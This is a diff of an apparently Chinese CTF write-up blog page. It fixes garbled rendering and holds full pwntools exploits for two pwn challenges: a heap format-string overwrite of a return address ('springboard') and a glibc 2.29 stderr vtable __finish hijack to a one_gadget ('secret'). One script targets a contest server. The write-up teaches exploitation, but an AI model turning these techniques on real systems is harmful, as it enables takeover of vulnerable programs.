@@ -316,8 +316,8 @@ else:
 <pre><code>jkkjjhjjkjjkkkuukukkuuhhhuukkk</code></pre><p>Md5一下即可。</p>
 <h3 id="T0p-Gear"><a href="#T0p-Gear" class="headerlink" title="T0p Gear"></a>T0p Gear</h3><p>题目不难，太菜了，看c++有点头大，做的有点慢。Ida动态调试，一共3个check，都是断在<code>Strcmp</code>。每次随便输入，然后分析和获取rdi，rsi寄存器对应地址处的字符串。拿到以后，3个拼接一下就是flag。</p>
 <h2 id="pwn"><a href="#pwn" class="headerlink" title="pwn"></a>pwn</h2><h3 id="springboard"><a href="#springboard" class="headerlink" title="springboard"></a>springboard</h3><p>考点就是堆上的格式化字符串利用，挺简单的。</p>
-<h4 id="攻击思路"><a href="#攻击思路" class="headerlink" title="攻击思路"></a>攻击思路</h4><ul>
-<li>利用环境变量那条链，进行攻击<code>ret address</code>，修改为one gadget<br>给了8次漏洞利用机会，还是很容易实现的。其中<code>ret address</code>，为<code>__libc_start_main+xxx</code><h3 id="EXP"><a href="#EXP" class="headerlink" title="EXP"></a>EXP</h3><pre><code class="python">from pwn import *
+<h4 id="攻击思路"><a href="#攻击思路" class="headerlink" title="攻击思路"></a>攻击思路</h4><p> 利用环境变量那条链，进行攻击<code>ret address</code>，修改为one gadget<br>给了8次漏洞利用机会，还是很容易实现的。其中<code>ret address</code>，为<code>__libc_start_main+xxx</code></p>
+<h4 id="EXP"><a href="#EXP" class="headerlink" title="EXP"></a>EXP</h4><pre><code class="python">from pwn import *
 import time
 local_file  = &#39;./springboard&#39;
 local_libc  = &#39;/lib/x86_64-linux-gnu/libc.so.6&#39;
@@ -325,11 +325,11 @@ remote_libc = local_libc # &#39;../libc.so.6
 context.log_level = &#39;debug&#39;
 debug = 0
 if debug:
-  io = process(local_file)
-  libc = ELF(local_libc)
+    io = process(local_file)
+    libc = ELF(local_libc)
 else:
-  io = remote(&#39;183.129.189.60&#39;,10029)
-  libc = ELF(remote_libc)
+    io = remote(&#39;183.129.189.60&#39;,10029)
+    libc = ELF(remote_libc)
 elf = ELF(local_file)
 # libc = elf.libc
 context.arch = elf.arch
@@ -350,51 +350,110 @@ uu64    = lambda data               :u64(data.ljust(8, &#39;\0&#39;))
 info_addr = lambda tag, addr        :io.info(tag + &#39;==&gt;&#39; +&#39;: {:#x}&#39;.format(addr))
 itr     = lambda                    :io.interactive()
 def debug():
-  # gdb.attach(proc.pidof(io)[0],gdbscript=&#39;b main&#39;)
-  gdb.attach(io)
-  pause()
+    # gdb.attach(proc.pidof(io)[0],gdbscript=&#39;b main&#39;)
+    gdb.attach(io)
+    pause()
+sla(&quot;input&quot;,&quot;1&quot;)
+sla(&quot;input&quot;,&quot;2&quot;)
+sla(&quot;input&quot;,&quot;3&quot;)
+sla(&quot;input&quot;,&quot;%13$pAAAA%11$p&quot;)
+sleep(0.1)
+ru(&quot;0x&quot;)
+tag = int(r(12),16) - 0xe0
+ru(&quot;AAAA0x&quot;)
+libc_base = int(r(12),16) -0x21b97
+info_addr(&quot;libc_base&quot;,libc_base)
+key1 = hex(tag)[-4:]
+print(key1)
+payload = &#39;%{}c%13$hn&#39;.format(int(key1,16))
+sla(&quot;input&quot;,payload)
+sleep(5)
+rec = rce18[1] + libc_base
+key2 = hex(rec)[-4:]
+print(key2)
+payload = &#39;%{}c%39$hn&#39;.format(int(key2,16))
+sla(&quot;input&quot;,payload)
+sleep(5)
+key3 = int(hex(tag)[-2:],16) + 2
+print(key3)
+payload = &#39;%{}c%13$hhn&#39;.format(key3)
+sla(&quot;input&quot;,payload)
+sleep(5)
+key4 = hex(rec)[-6:-4]
+print(key4)
+payload = &#39;%{}c%39$hhn&#39;.format(int(key4,16))
+sla(&quot;input&quot;,payload)
+itr()
+# 0000| 0x7fffffffe2f0 --&gt; 0x555555554980 (push   r15)
+# 0008| 0x7fffffffe2f8 --&gt; 0x55554780
+# 0016| 0x7fffffffe300 --&gt; 0x555555756010 (&quot;11111111aaaaaaaa1111111122222222\n&quot;)
+# 0024| 0x7fffffffe308 --&gt; 0x84fa9f2a7e35ae00
+# 0032| 0x7fffffffe310 --&gt; 0x555555554980 (push   r15)
+# 0040| 0x7fffffffe318 --&gt; 0x7ffff7a2d830 (&lt;__libc_start_main+240&gt;:       mov    edi,eax)
+# 0048| 0x7fffffffe320 --&gt; 0x1
+# 0056| 0x7fffffffe328 --&gt; 0x7fffffffe3f8 --&gt; 0x7fffffffe67a (&quot;/media/psf/mypwn/ahys/6/springboard/springboard&quot;)
+# 0064| 0x7fffffffe330 --&gt; 0x1f7ffcca0
+# 0072| 0x7fffffffe338 --&gt; 0x55555555488a (push   rbp)
+# 0080| 0x7fffffffe340 --&gt; 0x0
+# 0088| 0x7fffffffe348 --&gt; 0x6e8193b15e1baa42
+# 0096| 0x7fffffffe350 --&gt; 0x555555554780 (xor    ebp,ebp)
+# 0104| 0x7fffffffe358 --&gt; 0x7fffffffe3f0 --&gt; 0x1
+# 0112| 0x7fffffffe360 --&gt; 0x0
+# 0120| 0x7fffffffe368 --&gt; 0x0
+# 0128| 0x7fffffffe370 --&gt; 0x3bd4c6e40b5baa42
+# 0136| 0x7fffffffe378 --&gt; 0x3bd4d65e62cbaa42
+# 0144| 0x7fffffffe380 --&gt; 0x0
+# 0152| 0x7fffffffe388 --&gt; 0x0
+# 0040| 0x7ffe4f08d2d8 --&gt; 0x7f2169b2a830
+
 </code></pre>
-</li>
+<h3 id="secret"><a href="#secret" class="headerlink" title="secret"></a>secret</h3><p>考点就是<code>IO_FILE</code>的相关知识了，是针对伪造 vtable 劫持程序流程。</p>
+<p>这个题估计是参考<a href="https://xz.aliyun.com/t/7205" target="_blank" rel="noopener">https://xz.aliyun.com/t/7205</a>这个题出的，但是文中的题比这个要难多了。（ps：感谢出题人手下留情）</p>
+<h4 id="fclose-函数调用的-vtable-函数"><a href="#fclose-函数调用的-vtable-函数" class="headerlink" title="fclose 函数调用的 vtable 函数"></a>fclose 函数调用的 vtable 函数</h4><p><img src="http://qiqianyun.chumen77.xyz/uPic/QSynPX.png" srcset="/img/loading.gif" alt></p>
+<p>vtable 函数 指针：</p>
+<pre><code>/* The &#39;finish&#39; function does any final cleaning up of an _IO_FILE object.
+   It does not delete (free) it, but does everything else to finalize it.
+   It matches the streambuf::~streambuf virtual destructor.  */
+typedef void (*_IO_finish_t) (FILE *, int); /* finalize */
+#define _IO_FINISH(FP) JUMP1 (__finish, FP, 0)
+#define _IO_WFINISH(FP) WJUMP1 (__finish, FP, 0)
+
+struct _IO_jump_t
+{
+    JUMP_FIELD(size_t, __dummy);
+    JUMP_FIELD(size_t, __dummy2);
+    JUMP_FIELD(_IO_finish_t, __finish);
+    JUMP_FIELD(_IO_overflow_t, __overflow);
+    JUMP_FIELD(_IO_underflow_t, __underflow);
+    JUMP_FIELD(_IO_underflow_t, __uflow);
+    JUMP_FIELD(_IO_pbackfail_t, __pbackfail);
+    /* showmany */
+    JUMP_FIELD(_IO_xsputn_t, __xsputn);
+    JUMP_FIELD(_IO_xsgetn_t, __xsgetn);
+    JUMP_FIELD(_IO_seekoff_t, __seekoff);
+    JUMP_FIELD(_IO_seekpos_t, __seekpos);
+    JUMP_FIELD(_IO_setbuf_t, __setbuf);
+    JUMP_FIELD(_IO_sync_t, __sync);
+    JUMP_FIELD(_IO_doallocate_t, __doallocate);
+    JUMP_FIELD(_IO_read_t, __read);
+    JUMP_FIELD(_IO_write_t, __write);
+    JUMP_FIELD(_IO_seek_t, __seek);
+    JUMP_FIELD(_IO_close_t, __close);
+    JUMP_FIELD(_IO_stat_t, __stat);
+    JUMP_FIELD(_IO_showmanyc_t, __showmanyc);
+    JUMP_FIELD(_IO_imbue_t, __imbue);
+};</code></pre><p>对于攻击的vtable 函数 指针其中的：</p>
+<ul>
+<li><code>__finish__</code></li>
+<li><code>__close</code></li>
 </ul>
-<p>sla(“input”,”1”)<br>sla(“input”,”2”)<br>sla(“input”,”3”)<br>sla(“input”,”%13$pAAAA%11$p”)<br>sleep(0.1)<br>ru(“0x”)<br>tag = int(r(12),16) - 0xe0<br>ru(“AAAA0x”)<br>libc_base = int(r(12),16) -0x21b97<br>info_addr(“libc_base”,libc_base)<br>key1 = hex(tag)[-4:]<br>print(key1)<br>payload = ‘%{}c%13$hn’.format(int(key1,16))<br>sla(“input”,payload)<br>sleep(5)<br>rec = rce18<a href="https://www.52pojie.cn/thread-912103-1-1.html" target="_blank" rel="noopener">1</a> + libc_base<br>key2 = hex(rec)[-4:]<br>print(key2)<br>payload = ‘%{}c%39$hn’.format(int(key2,16))<br>sla(“input”,payload)<br>sleep(5)<br>key3 = int(hex(tag)[-2:],16) + 2<br>print(key3)<br>payload = ‘%{}c%13$hhn’.format(key3)<br>sla(“input”,payload)<br>sleep(5)<br>key4 = hex(rec)[-6:-4]<br>print(key4)<br>payload = ‘%{}c%39$hhn’.format(int(key4,16))<br>sla(“input”,payload)<br>itr()</p>
-<h1 id="0000-0x7fffffffe2f0-–-gt-0x555555554980-push-r15"><a href="#0000-0x7fffffffe2f0-–-gt-0x555555554980-push-r15" class="headerlink" title="0000| 0x7fffffffe2f0 –&gt; 0x555555554980 (push   r15)"></a>0000| 0x7fffffffe2f0 –&gt; 0x555555554980 (push   r15)</h1><h1 id="0008-0x7fffffffe2f8-–-gt-0x55554780"><a href="#0008-0x7fffffffe2f8-–-gt-0x55554780" class="headerlink" title="0008| 0x7fffffffe2f8 –&gt; 0x55554780"></a>0008| 0x7fffffffe2f8 –&gt; 0x55554780</h1><h1 id="0016-0x7fffffffe300-–-gt-0x555555756010-“11111111aaaaaaaa1111111122222222-n”"><a href="#0016-0x7fffffffe300-–-gt-0x555555756010-“11111111aaaaaaaa1111111122222222-n”" class="headerlink" title="0016| 0x7fffffffe300 –&gt; 0x555555756010 (“11111111aaaaaaaa1111111122222222\n”)"></a>0016| 0x7fffffffe300 –&gt; 0x555555756010 (“11111111aaaaaaaa1111111122222222\n”)</h1><h1 id="0024-0x7fffffffe308-–-gt-0x84fa9f2a7e35ae00"><a href="#0024-0x7fffffffe308-–-gt-0x84fa9f2a7e35ae00" class="headerlink" title="0024| 0x7fffffffe308 –&gt; 0x84fa9f2a7e35ae00"></a>0024| 0x7fffffffe308 –&gt; 0x84fa9f2a7e35ae00</h1><h1 id="0032-0x7fffffffe310-–-gt-0x555555554980-push-r15"><a href="#0032-0x7fffffffe310-–-gt-0x555555554980-push-r15" class="headerlink" title="0032| 0x7fffffffe310 –&gt; 0x555555554980 (push   r15)"></a>0032| 0x7fffffffe310 –&gt; 0x555555554980 (push   r15)</h1><h1 id="0040-0x7fffffffe318-–-gt-0x7ffff7a2d830-lt-libc-start-main-240-gt-mov-edi-eax"><a href="#0040-0x7fffffffe318-–-gt-0x7ffff7a2d830-lt-libc-start-main-240-gt-mov-edi-eax" class="headerlink" title="0040| 0x7fffffffe318 –&gt; 0x7ffff7a2d830 (&lt;__libc_start_main+240&gt;:       mov    edi,eax)"></a>0040| 0x7fffffffe318 –&gt; 0x7ffff7a2d830 (&lt;__libc_start_main+240&gt;:       mov    edi,eax)</h1><h1 id="0048-0x7fffffffe320-–-gt-0x1"><a href="#0048-0x7fffffffe320-–-gt-0x1" class="headerlink" title="0048| 0x7fffffffe320 –&gt; 0x1"></a>0048| 0x7fffffffe320 –&gt; 0x1</h1><h1 id="0056-0x7fffffffe328-–-gt-0x7fffffffe3f8-–-gt-0x7fffffffe67a-“-media-psf-mypwn-ahys-6-springboard-springboard”"><a href="#0056-0x7fffffffe328-–-gt-0x7fffffffe3f8-–-gt-0x7fffffffe67a-“-media-psf-mypwn-ahys-6-springboard-springboard”" class="headerlink" title="0056| 0x7fffffffe328 –&gt; 0x7fffffffe3f8 –&gt; 0x7fffffffe67a (“/media/psf/mypwn/ahys/6/springboard/springboard”)"></a>0056| 0x7fffffffe328 –&gt; 0x7fffffffe3f8 –&gt; 0x7fffffffe67a (“/media/psf/mypwn/ahys/6/springboard/springboard”)</h1><h1 id="0064-0x7fffffffe330-–-gt-0x1f7ffcca0"><a href="#0064-0x7fffffffe330-–-gt-0x1f7ffcca0" class="headerlink" title="0064| 0x7fffffffe330 –&gt; 0x1f7ffcca0"></a>0064| 0x7fffffffe330 –&gt; 0x1f7ffcca0</h1><h1 id="0072-0x7fffffffe338-–-gt-0x55555555488a-push-rbp"><a href="#0072-0x7fffffffe338-–-gt-0x55555555488a-push-rbp" class="headerlink" title="0072| 0x7fffffffe338 –&gt; 0x55555555488a (push   rbp)"></a>0072| 0x7fffffffe338 –&gt; 0x55555555488a (push   rbp)</h1><h1 id="0080-0x7fffffffe340-–-gt-0x0"><a href="#0080-0x7fffffffe340-–-gt-0x0" class="headerlink" title="0080| 0x7fffffffe340 –&gt; 0x0"></a>0080| 0x7fffffffe340 –&gt; 0x0</h1><h1 id="0088-0x7fffffffe348-–-gt-0x6e8193b15e1baa42"><a href="#0088-0x7fffffffe348-–-gt-0x6e8193b15e1baa42" class="headerlink" title="0088| 0x7fffffffe348 –&gt; 0x6e8193b15e1baa42"></a>0088| 0x7fffffffe348 –&gt; 0x6e8193b15e1baa42</h1><h1 id="0096-0x7fffffffe350-–-gt-0x555555554780-xor-ebp-ebp"><a href="#0096-0x7fffffffe350-–-gt-0x555555554780-xor-ebp-ebp" class="headerlink" title="0096| 0x7fffffffe350 –&gt; 0x555555554780 (xor    ebp,ebp)"></a>0096| 0x7fffffffe350 –&gt; 0x555555554780 (xor    ebp,ebp)</h1><h1 id="0104-0x7fffffffe358-–-gt-0x7fffffffe3f0-–-gt-0x1"><a href="#0104-0x7fffffffe358-–-gt-0x7fffffffe3f0-–-gt-0x1" class="headerlink" title="0104| 0x7fffffffe358 –&gt; 0x7fffffffe3f0 –&gt; 0x1"></a>0104| 0x7fffffffe358 –&gt; 0x7fffffffe3f0 –&gt; 0x1</h1><h1 id="0112-0x7fffffffe360-–-gt-0x0"><a href="#0112-0x7fffffffe360-–-gt-0x0" class="headerlink" title="0112| 0x7fffffffe360 –&gt; 0x0"></a>0112| 0x7fffffffe360 –&gt; 0x0</h1><h1 id="0120-0x7fffffffe368-–-gt-0x0"><a href="#0120-0x7fffffffe368-–-gt-0x0" class="headerlink" title="0120| 0x7fffffffe368 –&gt; 0x0"></a>0120| 0x7fffffffe368 –&gt; 0x0</h1><h1 id="0128-0x7fffffffe370-–-gt-0x3bd4c6e40b5baa42"><a href="#0128-0x7fffffffe370-–-gt-0x3bd4c6e40b5baa42" class="headerlink" title="0128| 0x7fffffffe370 –&gt; 0x3bd4c6e40b5baa42"></a>0128| 0x7fffffffe370 –&gt; 0x3bd4c6e40b5baa42</h1><h1 id="0136-0x7fffffffe378-–-gt-0x3bd4d65e62cbaa42"><a href="#0136-0x7fffffffe378-–-gt-0x3bd4d65e62cbaa42" class="headerlink" title="0136| 0x7fffffffe378 –&gt; 0x3bd4d65e62cbaa42"></a>0136| 0x7fffffffe378 –&gt; 0x3bd4d65e62cbaa42</h1><h1 id="0144-0x7fffffffe380-–-gt-0x0"><a href="#0144-0x7fffffffe380-–-gt-0x0" class="headerlink" title="0144| 0x7fffffffe380 –&gt; 0x0"></a>0144| 0x7fffffffe380 –&gt; 0x0</h1><h1 id="0152-0x7fffffffe388-–-gt-0x0"><a href="#0152-0x7fffffffe388-–-gt-0x0" class="headerlink" title="0152| 0x7fffffffe388 –&gt; 0x0"></a>0152| 0x7fffffffe388 –&gt; 0x0</h1><h1 id="0040-0x7ffe4f08d2d8-–-gt-0x7f2169b2a830"><a href="#0040-0x7ffe4f08d2d8-–-gt-0x7f2169b2a830" class="headerlink" title="0040| 0x7ffe4f08d2d8 –&gt; 0x7f2169b2a830"></a>0040| 0x7ffe4f08d2d8 –&gt; 0x7f2169b2a830</h1><pre><code>
-### secret
-考点就是`IO_FILE_`的相关知识了，是针对伪造 vtable 劫持程序流程。
-
-这个题估计是参考[https://xz.aliyun.com/t/7205][2]这个题出的，但是文中的题比这个要难多了。（ps：感谢出题人手下留情）
-
-#### fclose 函数调用的 vtable 函数
-
-![][image-5]
-vtable 函数 指针：
-</code></pre><p>/* The ‘finish’ function does any final cleaning up of an _IO_FILE object.<br>   It does not delete (free) it, but does everything else to finalize it.<br>   It matches the streambuf::~streambuf virtual destructor.  <em>/<br>typedef void (</em>_IO_finish_t) (FILE <em>, int); /</em> finalize */</p>
-<p>#define _IO_FINISH(FP) JUMP1 (__finish, FP, 0)</p>
-<p>#define _IO_WFINISH(FP) WJUMP1 (__finish, FP, 0)</p>
-<p>struct _IO_jump_t<br>{<br>    JUMP_FIELD(size_t, __dummy);<br>    JUMP_FIELD(size_t, __dummy2);<br>    JUMP_FIELD(_IO_finish_t, __finish);<br>    JUMP_FIELD(_IO_overflow_t, __overflow);<br>    JUMP_FIELD(_IO_underflow_t, __underflow);<br>    JUMP_FIELD(_IO_underflow_t, __uflow);<br>    JUMP_FIELD(_IO_pbackfail_t, __pbackfail);<br>    /* showmany */<br>    JUMP_FIELD(_IO_xsputn_t, __xsputn);<br>    JUMP_FIELD(_IO_xsgetn_t, __xsgetn);<br>    JUMP_FIELD(_IO_seekoff_t, __seekoff);<br>    JUMP_FIELD(_IO_seekpos_t, __seekpos);<br>    JUMP_FIELD(_IO_setbuf_t, __setbuf);<br>    JUMP_FIELD(_IO_sync_t, __sync);<br>    JUMP_FIELD(_IO_doallocate_t, __doallocate);<br>    JUMP_FIELD(_IO_read_t, __read);<br>    JUMP_FIELD(_IO_write_t, __write);<br>    JUMP_FIELD(_IO_seek_t, __seek);<br>    JUMP_FIELD(_IO_close_t, __close);<br>    JUMP_FIELD(_IO_stat_t, __stat);<br>    JUMP_FIELD(_IO_showmanyc_t, __showmanyc);<br>    JUMP_FIELD(_IO_imbue_t, __imbue);<br>};</p>
-<pre><code>
-对于攻击的vtable 函数 指针其中的：
-- `__finish__`
-- `__close`
-
-其执行顺序是先close，然后finish。由于程序给的是0x18字节的任意写，攻击 `__finish__`就可以了。
-#### libc2.29中的vtable
-vtable的值，以及其对应的函数指针，在glibc 2.29下是可写的。这个是很重要的一点，本来个人不知道这个，想了好久其他的办法来利用。
-
-**在glibc 2.23以及glibc 2.27其都是不可写的**。
-
-正是因为可以写，所以这个题难度就降低了很多。
-#### 攻击思路
-利用程序的最后一次任意地址写，直接把`__IO_2_1_stderr的vtable`上`__finish__`指针修改为one gadget。
-（这里的one gadget，需要自己多试）。
-##### 小tips
-
-第2次的2字节读入可以直接用其本来地址末2字节即可，直接在`__IO_2_1_stderr的vtable`不用转移也可以的。（看到有别的师傅转移到其他vtable地址的。）并且，由于是read函数，直接发个`\x60`一个字节即可。
-
-
-#### exp
-
-```python
-from pwn import *
+<p>其执行顺序是先close，然后finish。由于程序给的是0x18字节的任意写，攻击 <code>__finish__</code>就可以了。</p>
+<h4 id="libc2-29中的vtable"><a href="#libc2-29中的vtable" class="headerlink" title="libc2.29中的vtable"></a>libc2.29中的vtable</h4><p>vtable的值，以及其对应的函数指针，在glibc 2.29下是可写的。这个是很重要的一点，本来个人不知道这个，想了好久其他的办法来利用。</p>
+<p><strong>在glibc 2.23以及glibc 2.27其都是不可写的</strong>。</p>
+<p>正是因为可以写，所以这个题难度就降低了很多。</p>
+<h4 id="攻击思路-1"><a href="#攻击思路-1" class="headerlink" title="攻击思路"></a>攻击思路</h4><p>利用程序的最后一次任意地址写，直接把<code>__IO_2_1_stderr的vtable</code>上<code>__finish__</code>指针修改为one gadget。<br>（这里的one gadget，需要自己多试）。</p>
+<h5 id="小tips"><a href="#小tips" class="headerlink" title="小tips"></a>小tips</h5><p>第2次的2字节读入可以直接用其本来地址末2字节即可，直接在<code>__IO_2_1_stderr的vtable</code>不用转移也可以的。（看到有别的师傅转移到其他vtable地址的。）并且，由于是read函数，直接发个<code>\x60</code>一个字节即可。</p>
+<h4 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h4><pre><code class="python">from pwn import *
 import time
 local_file  = &#39;./secret&#39;
 local_libc  = &#39;/usr/lib/x86_64-linux-gnu/libc-2.29.so&#39;
@@ -442,7 +501,8 @@ s(&#39;\x60&#39;)
 sleep(0.1)
 rec = 0xe2386 + libc_base
 s(p64(0) + p64(0)+p64(rec))
-itr()</code></pre><p>由于提前就<code>fclose(stdout)</code>,getshell以后也不会有任何的输出，所以得用<code>exec 1&gt;&amp;2</code>来恢复输出。</p>
+itr()</code></pre>
+<p>由于提前就<code>fclose(stdout)</code>,getshell以后也不会有任何的输出，所以得用<code>exec 1&gt;&amp;2</code>来恢复输出。</p>
 
             <hr>
           </div>
